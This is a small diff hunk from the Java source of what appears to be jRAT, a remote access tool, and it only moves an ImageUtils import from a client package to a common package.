@@ -6,9 +6,9 @@ import java.util.List;
 
 import se.jrat.client.Slave;
 import se.jrat.client.ui.dialogs.DialogPickMonitor;
-import se.jrat.client.utils.ImageUtils;
 import se.jrat.common.compress.GZip;
 import se.jrat.common.crypto.Crypto;
+import se.jrat.common.utils.ImageUtils;
 
 import com.redpois0n.graphs.monitors.PanelMonitors.PanelMonitor;
 
